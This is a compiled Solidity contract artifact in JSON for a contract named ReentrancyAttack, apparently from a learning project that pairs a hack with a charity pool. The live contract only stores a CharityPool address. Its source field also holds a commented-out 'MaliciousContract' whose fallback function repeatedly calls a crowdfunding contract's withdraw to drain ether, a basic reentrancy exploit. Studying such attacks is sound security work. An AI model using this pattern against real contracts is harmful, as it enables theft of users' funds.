{
  "contractName": "ReentrancyAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_charityPool",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "charityPool",
      "outputs": [
        {
          "internalType": "contract CharityPool",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516101623803806101628339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505060cf806100936000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638f856eab14602d575b600080fd5b60336075565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea265627a7a723158206462e46d66f4e1cf33c184f50e8e748062a560bea72b48f2d71e53acc8e3b66c64736f6c63430005100032",
  "source": "\npragma solidity ^0.5.0;\n\n\nimport './CharityPool.sol';\n\ncontract ReentrancyAttack {\n\n\n    CharityPool public charityPool;\n\n    constructor(address _charityPool) public {\n        charityPool = CharityPool(_charityPool);\n    }\n\n\n}\n\n\n// contract MaliciousContract {\n//     Crowdfunding public crowdfunding;\n\n//     constructor(address _crowdfundingAddress) {\n//         crowdfunding = Crowdfunding(_crowdfundingAddress);\n//     }\n\n//     fallback() external payable {\n//         if (address(crowdfunding).balance >= 1 ether) {\n//             crowdfunding.withdraw(1 ether);\n//         }\n//     }\n\n//     function initiateAttack() public {\n//         crowdfunding.withdraw(1 ether);\n//     }\n\n//     function getBalance() public view returns (uint) {\n//         return address(this).balance;\n//     }\n// }\n",
  "sourcePath": "/Users/Nelson/Desktop/DEX-web-app/src/contracts/Hack And Charity Pool/ReentrancyAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-07-14T20:13:23.841Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}